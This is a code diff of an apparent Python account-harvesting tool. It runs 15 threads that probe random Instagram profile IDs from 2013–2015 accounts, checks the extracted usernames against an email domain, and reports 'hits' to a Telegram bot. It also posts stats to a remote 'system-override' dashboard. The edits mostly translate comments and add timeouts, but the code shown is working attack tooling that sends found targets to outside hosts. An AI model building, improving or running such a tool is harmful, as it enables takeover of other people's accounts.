@@ -7,7 +7,6 @@ import random
 import hashlib
 import uuid
 import time
-from datetime import datetime
 from threading import Thread, Lock
 import requests
 from requests import post as pp
@@ -20,13 +19,13 @@ init(autoreset=True)
 # ================= FIXED DASHBOARD SYNC LOGIC =================
 def send_to_dashboard(stat_type):
     try:
-        # Render Live URL - Dashboard stats sync ke liye
+        # Render Live URL - Dashboard stats sync
         url = 'https://system-override-v2.onrender.com/update_stats'
         requests.post(url, json={'type': stat_type}, timeout=3)
     except:
         pass
 
-# Dashboard automatically ID aur Token bhejta hai
+# Dashboard passes ID and Token automatically as arguments
 if len(sys.argv) > 2:
     ID = sys.argv[1]
     TOKEN = sys.argv[2]
@@ -65,7 +64,6 @@ def get_google_token():
         time.sleep(2)
         get_google_token()
 
-# Start token generation
 if not os.path.exists(TOKEN_FILE):
     get_google_token()
 
@@ -117,15 +115,15 @@ def send_hit_telegram(email):
 ━━━━━━━━━━━━━━━
 """
     try:
-        # NO BRACKETS: Direct variables used for Telegram API
-        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
+        # NO BRACKETS: Fixes the 404/Telegram Message issue
+        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}", timeout=10)
     except:
         pass
 
 def worker():
     while True:
         lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-        # 2013-2015 ID Range logic
+        # Targeted UID range for 2013-2015 accounts
         data = {
             'lsd': lsd,
             'variables': json.dumps({'id': random.randrange(266028916, 1900000000), 'render_surface': 'PROFILE'}),
@@ -138,9 +136,9 @@ def worker():
             if username:
                 check_instagram(username + eizon_domain)
         except:
-            time.sleep(2)
+            time.sleep(1)
 
-# Threads - Render Free Tier par 15 best hain stability ke liye
+# Threads - Render Free Tier stability
 for _ in range(15):
     Thread(target=worker, daemon=True).start()
 
